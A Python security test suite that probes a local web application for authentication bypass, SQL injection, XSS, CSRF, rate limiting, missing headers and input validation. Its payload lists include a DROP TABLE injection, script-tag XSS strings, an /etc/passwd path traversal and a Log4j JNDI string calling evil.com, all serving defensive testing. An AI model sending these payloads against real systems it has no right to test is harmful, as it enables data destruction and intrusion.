#!/usr/bin/env python3
"""
PAKE System - Security Test Suite
Comprehensive security testing for CI/CD pipeline
"""

import argparse
import asyncio
import json
import sys
import time
from typing import Any

import httpx


class SecurityTestSuite:
    """Comprehensive security test suite for PAKE System"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip("/")
        self.results = {
            "timestamp": time.time(),
            "base_url": base_url,
            "tests": [],
            "summary": {"total": 0, "passed": 0, "failed": 0, "critical_failures": 0},
        }

    async def run_test(self, test_name: str, test_func) -> dict[str, Any]:
        """Run a single security test"""
        print(f"🔒 Running security test: {test_name}")

        try:
            result = await test_func()
            self.results["tests"].append(
                {
                    "name": test_name,
                    "status": "passed" if result["passed"] else "failed",
                    "details": result.get("details", ""),
                    "critical": result.get("critical", False),
                }
            )

            if result["passed"]:
                self.results["summary"]["passed"] += 1
                print(f"✅ {test_name}: PASSED")
            else:
                self.results["summary"]["failed"] += 1
                if result.get("critical", False):
                    self.results["summary"]["critical_failures"] += 1
                print(f"❌ {test_name}: FAILED - {result.get('details', '')}")

        except Exception as e:
            self.results["tests"].append(
                {
                    "name": test_name,
                    "status": "error",
                    "details": str(e),
                    "critical": True,
                }
            )
            self.results["summary"]["failed"] += 1
            self.results["summary"]["critical_failures"] += 1
            print(f"💥 {test_name}: ERROR - {str(e)}")

        self.results["summary"]["total"] += 1
        return {"status": "completed"}

    async def test_authentication_bypass(self) -> dict[str, Any]:
        """Test for authentication bypass vulnerabilities"""
        async with httpx.AsyncClient() as client:
            # Test protected endpoints without authentication
            protected_endpoints = [
                "/auth/profile",
                "/auth/users",
                "/admin/dashboard",
                "/api/v1/sensitive-data",
            ]

            bypass_attempts = 0
            for endpoint in protected_endpoints:
                try:
                    response = await client.get(f"{self.base_url}{endpoint}")
                    if response.status_code == 200:
                        bypass_attempts += 1
                except:
                    pass

            return {
                "passed": bypass_attempts == 0,
                "critical": True,
                "details": f"Authentication bypass attempts: {bypass_attempts}/{len(protected_endpoints)}",
            }

    async def test_sql_injection(self) -> dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        async with httpx.AsyncClient() as client:
            sql_payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "1' OR '1'='1' --",
            ]

            vulnerable_endpoints = 0
            for payload in sql_payloads:
                try:
                    # Test common endpoints that might be vulnerable
                    response = await client.get(
                        f"{self.base_url}/api/search", params={"q": payload}
                    )
                    # Check for SQL error messages in response
                    if any(
                        error in response.text.lower()
                        for error in [
                            "sql",
                            "database",
                            "mysql",
                            "postgresql",
                            "syntax error",
                        ]
                    ):
                        vulnerable_endpoints += 1
                except:
                    pass

            return {
                "passed": vulnerable_endpoints == 0,
                "critical": True,
                "details": f"SQL injection vulnerabilities found: {vulnerable_endpoints}",
            }

    async def test_xss_vulnerabilities(self) -> dict[str, Any]:
        """Test for Cross-Site Scripting vulnerabilities"""
        async with httpx.AsyncClient() as client:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
            ]

            vulnerable_endpoints = 0
            for payload in xss_payloads:
                try:
                    response = await client.post(
                        f"{self.base_url}/api/comment", json={"content": payload}
                    )
                    if payload in response.text:
                        vulnerable_endpoints += 1
                except:
                    pass

            return {
                "passed": vulnerable_endpoints == 0,
                "critical": True,
                "details": f"XSS vulnerabilities found: {vulnerable_endpoints}",
            }

    async def test_csrf_protection(self) -> dict[str, Any]:
        """Test for CSRF protection"""
        async with httpx.AsyncClient() as client:
            # Test if CSRF tokens are required for state-changing operations
            try:
                response = await client.post(
                    f"{self.base_url}/api/user/update",
                    json={"email": "test@example.com"},
                )
                # If request succeeds without CSRF token, it's vulnerable
                csrf_protected = response.status_code in [403, 400]

                return {
                    "passed": csrf_protected,
                    "critical": False,
                    "details": "CSRF protection"
                    + ("enabled" if csrf_protected else "disabled"),
                }
            except:
                return {
                    "passed": False,
                    "critical": False,
                    "details": "Could not test CSRF protection",
                }

    async def test_rate_limiting(self) -> dict[str, Any]:
        """Test for rate limiting implementation"""
        async with httpx.AsyncClient() as client:
            # Send multiple requests rapidly
            requests_sent = 0
            rate_limited = False

            for i in range(100):  # Send 100 requests rapidly
                try:
                    response = await client.get(f"{self.base_url}/api/data")
                    requests_sent += 1
                    if response.status_code == 429:  # Too Many Requests
                        rate_limited = True
                        break
                except:
                    break

            return {
                "passed": rate_limited,
                "critical": False,
                "details": f"Rate limiting {'enabled' if rate_limited else 'disabled'} after {requests_sent} requests",
            }

    async def test_headers_security(self) -> dict[str, Any]:
        """Test for security headers"""
        async with httpx.AsyncClient() as client:
            try:
                response = await client.get(f"{self.base_url}/")
                headers = response.headers

                security_headers = {
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": "DENY",
                    "X-XSS-Protection": "1; mode=block",
                    "Strict-Transport-Security": "max-age=31536000",
                    "Content-Security-Policy": "default-src 'self'",
                }

                missing_headers = []
                for header, expected_value in security_headers.items():
                    if header not in headers:
                        missing_headers.append(header)

                return {
                    "passed": len(missing_headers) == 0,
                    "critical": False,
                    "details": f"Missing security headers: {', '.join(missing_headers)}",
                }
            except:
                return {
                    "passed": False,
                    "critical": False,
                    "details": "Could not test security headers",
                }

    async def test_input_validation(self) -> dict[str, Any]:
        """Test for input validation vulnerabilities"""
        async with httpx.AsyncClient() as client:
            malicious_inputs = [
                "../../etc/passwd",  # Path traversal
                "null\x00byte",  # Null byte injection
                "A" * 10000,  # Buffer overflow attempt
                "<script>",  # Script injection
                "${jndi:ldap://evil.com/a}",  # Log4j vulnerability
            ]

            vulnerable_inputs = 0
            for malicious_input in malicious_inputs:
                try:
                    response = await client.post(
                        f"{self.base_url}/api/upload",
                        json={"filename": malicious_input},
                    )
                    # Check if malicious input is reflected in response
                    if malicious_input in response.text:
                        vulnerable_inputs += 1
                except:
                    pass

            return {
                "passed": vulnerable_inputs == 0,
                "critical": True,
                "details": f"Input validation vulnerabilities: {vulnerable_inputs}",
            }

    async def run_all_tests(self):
        """Run all security tests"""
        print("🛡️ Starting PAKE System Security Test Suite")
        print(f"Target URL: {self.base_url}")
        print("=" * 50)

        tests = [
            ("Authentication Bypass", self.test_authentication_bypass),
            ("SQL Injection", self.test_sql_injection),
            ("XSS Vulnerabilities", self.test_xss_vulnerabilities),
            ("CSRF Protection", self.test_csrf_protection),
            ("Rate Limiting", self.test_rate_limiting),
            ("Security Headers", self.test_headers_security),
            ("Input Validation", self.test_input_validation),
        ]

        for test_name, test_func in tests:
            await self.run_test(test_name, test_func)

        # Generate summary
        print("\n" + "=" * 50)
        print("🛡️ Security Test Suite Summary")
        print(f"Total Tests: {self.results['summary']['total']}")
        print(f"Passed: {self.results['summary']['passed']}")
        print(f"Failed: {self.results['summary']['failed']}")
        print(f"Critical Failures: {self.results['summary']['critical_failures']}")

        if self.results["summary"]["critical_failures"] > 0:
            print("❌ CRITICAL SECURITY ISSUES FOUND!")
            return False
        elif self.results["summary"]["failed"] > 0:
            print("⚠️ Some security issues found, but none critical")
            return True
        else:
            print("✅ All security tests passed!")
            return True

    def save_report(self, filename: str = "security_test_report.json"):
        """Save test results to file"""
        with open(filename, "w") as f:
            json.dump(self.results, f, indent=2)
        print(f"📄 Security test report saved to {filename}")


async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="PAKE System Security Test Suite")
    parser.add_argument(
        "--base-url",
        default="http://localhost:8000",
        help="Base URL of the application to test",
    )
    parser.add_argument(
        "--output",
        default="security_test_report.json",
        help="Output file for test results",
    )

    args = parser.parse_args()

    test_suite = SecurityTestSuite(args.base_url)
    success = await test_suite.run_all_tests()
    test_suite.save_report(args.output)

    # Exit with appropriate code
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    asyncio.run(main())
